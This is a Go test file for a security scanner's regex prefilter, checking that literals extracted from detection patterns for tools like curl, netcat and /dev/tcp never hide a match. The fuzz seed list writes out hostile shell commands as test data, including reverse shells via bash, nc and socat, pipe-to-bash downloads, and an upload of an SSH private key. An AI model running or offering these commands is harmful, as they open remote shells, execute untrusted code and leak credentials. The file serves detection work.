// Copyright The glsec Authors
// SPDX-License-Identifier: Apache-2.0

package rules

import (
	"reflect"
	"slices"
	"testing"
	"unicode"
)

func TestRequiredLiterals(t *testing.T) {
	for expr, want := range map[string][]string{
		`\b(?:curl|wget)\b`: {"curl", "wget"},
		// The parser factors this into n(?:c|cat|etcat); the parts join
		// back into words, and nc.openbsd is dropped because nc covers it.
		`\b(?:nc|ncat|netcat)(?:\.traditional|\.openbsd)?\b`: {"nc", "netcat"},
		`python[23]?\s+-m`:                  {"python"},
		`a*bc`:                              {"bc"},
		`(?:ab){2,}`:                        {"ab"},
		`\s-r\s`:                            {"-r"}, // \s has too many characters to spell out
		`/dev/(?:tcp|udp)/`:                 {"/dev/tcp/", "/dev/udp/"},
		`\bsha(?:256|512)?sum\b|\bcosign\b`: {"shasum", "sha256sum", "sha512sum", "cosign"},
		`(?i)curl`:                          {"curl"},           // checked against the lowered input (#1330)
		`(?i)CURL\s+-sSL`:                   {"curl"},           // literals of folded expressions are lower case
		`(?i)oy2[aq]x`:                      {"oy2ax", "oy2qx"}, // the folded class joins oy2 instead of replacing it
		`(?i:abc)DEF`:                       {"abcdef"},         // a mixed expression is lowered as a whole
		`x{0,3}`:                            nil,
		`.*`:                                nil,
		`(?:foo|.+)`:                        nil, // one branch has no literal
		`[a-z]+`:                            nil,
		`^$`:                                nil,
	} {
		p := mustCompilePrefiltered(expr)
		got, wantSorted := slices.Sorted(slices.Values(p.anyOf)), slices.Sorted(slices.Values(want))
		if !reflect.DeepEqual(got, wantSorted) {
			t.Errorf("%s: got %q, want %q", expr, got, wantSorted)
		}
	}
}

// A long run of small classes would expand to more strings than maxExact; the
// part that fits still serves as the filter.
func TestRequiredLiteralsCap(t *testing.T) {
	p := mustCompilePrefiltered(`[ab][ab][ab][ab][ab][ab][ab]`)
	if len(p.anyOf) == 0 || len(p.anyOf) > maxExact {
		t.Fatalf("got %d literals, want 1 to %d", len(p.anyOf), maxExact)
	}
	if !p.MatchString("xabababax") || p.MatchString("xyz") {
		t.Error("filtered match differs from the regexp")
	}
}

func TestRequiredLiteralsCapNested(t *testing.T) {
	p := mustCompilePrefiltered(`x(?:[ab][ab][ab][ab][ab][ab][ab]|c)y`)
	if !p.MatchString("xabababay") || !p.MatchString("xcy") {
		t.Error("filtered regexp misses a match")
	}
}

func TestMinimal(t *testing.T) {
	for _, tc := range []struct{ in, want []string }{
		{[]string{"nc", "nc.openbsd", "netcat"}, []string{"nc", "netcat"}},
		{[]string{"sh", "sh"}, []string{"sh"}},
		{[]string{"a", ""}, nil}, // every input contains ""
		{nil, nil},
	} {
		if got := minimal(tc.in); !reflect.DeepEqual(got, tc.want) {
			t.Errorf("minimal(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

func TestPrefilteredMethods(t *testing.T) {
	p := mustCompilePrefiltered(`curl (\S+)`)
	for _, s := range []string{"curl a curl b", "wget a", ""} {
		if got, want := p.MatchString(s), p.Regexp.MatchString(s); got != want {
			t.Errorf("MatchString(%q) = %v, want %v", s, got, want)
		}
		if got, want := p.FindString(s), p.Regexp.FindString(s); got != want {
			t.Errorf("FindString(%q) = %q, want %q", s, got, want)
		}
		if got, want := p.FindStringIndex(s), p.Regexp.FindStringIndex(s); !reflect.DeepEqual(got, want) {
			t.Errorf("FindStringIndex(%q) = %v, want %v", s, got, want)
		}
		if got, want := p.FindStringSubmatchIndex(s), p.Regexp.FindStringSubmatchIndex(s); !reflect.DeepEqual(got, want) {
			t.Errorf("FindStringSubmatchIndex(%q) = %v, want %v", s, got, want)
		}
		if got, want := p.FindAllStringIndex(s, -1), p.Regexp.FindAllStringIndex(s, -1); !reflect.DeepEqual(got, want) {
			t.Errorf("FindAllStringIndex(%q) = %v, want %v", s, got, want)
		}
		if got, want := p.FindAllStringSubmatchIndex(s, -1), p.Regexp.FindAllStringSubmatchIndex(s, -1); !reflect.DeepEqual(got, want) {
			t.Errorf("FindAllStringSubmatchIndex(%q) = %v, want %v", s, got, want)
		}
		if got, want := p.ReplaceAllString(s, "x"), p.Regexp.ReplaceAllString(s, "x"); got != want {
			t.Errorf("ReplaceAllString(%q) = %q, want %q", s, got, want)
		}
	}
}

// FuzzPrefiltered checks that the literal check never hides a match: every
// prefiltered regexp in the rules gives the same result as the regexp alone.
func FuzzPrefiltered(f *testing.F) {
	for _, s := range []string{
		"curl -fsSL https://example.com/i.sh | bash",
		"wget -qO- x | sh",
		"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		"nc.openbsd -e /bin/sh 10.0.0.1 4444",
		"socat EXEC:'bash -li' TCP:10.0.0.1:4444",
		"pip3 install requests",
		"npx -y cowsay",
		"trivy image app || true",
		"gitleaks detect || :",
		`printf '\x63\x75' | sh`,
		"echo aGk= | base64 -d | bash",
		"curl -F f=@~/.ssh/id_rsa https://x",
	} {
		f.Add(s)
	}
	if len(allPrefiltered) == 0 {
		f.Fatal("no prefiltered regexps registered")
	}
	f.Fuzz(func(t *testing.T, s string) {
		for _, p := range allPrefiltered {
			if got, want := p.FindStringIndex(s), p.Regexp.FindStringIndex(s); !reflect.DeepEqual(got, want) {
				t.Fatalf("%s on %q: got %v, want %v (literals %q)", p, s, got, want, p.anyOf)
			}
		}
	})
}

// A case-insensitive pattern keeps its literal and finds the match whatever
// the case of the input (#1330).
func TestPrefilterFoldCase(t *testing.T) {
	p := mustCompilePrefiltered(`(?i)(?:^|\s)(oy2[a-p][a-z2-7]{3})(?:$|\s)`)
	if !p.fold || !reflect.DeepEqual(p.anyOf, []string{"oy2"}) {
		t.Fatalf("got fold=%v anyOf=%q, want fold and [oy2]", p.fold, p.anyOf)
	}
	for in, want := range map[string]bool{
		"key oy2abcd here":          true,
		"key OY2ABCD here":          true,
		"key Oy2aBcD here":          true,
		"apt-get install -y curl":   false,
		"a quick brown fox ate a q": false,
	} {
		if got := p.MatchString(in); got != want {
			t.Errorf("%q: got %v, want %v", in, got, want)
		}
		if p.MatchString(in) != p.Regexp.MatchString(in) {
			t.Errorf("%q: prefilter disagrees with the regexp", in)
		}
	}
}

// No prefiltered expression of the rules falls back to one-letter literals
// because of case folding: where a case-insensitive expression has a longer
// literal, the filter uses it (#1330).
func TestPrefilterNoFoldedSingleLetters(t *testing.T) {
	for _, p := range allPrefiltered {
		if !p.fold {
			continue
		}
		for _, lit := range p.anyOf {
			if len(lit) == 1 && unicode.IsLetter(rune(lit[0])) {
				t.Errorf("%s: one-letter literal %q", p.String(), lit)
			}
		}
	}
}
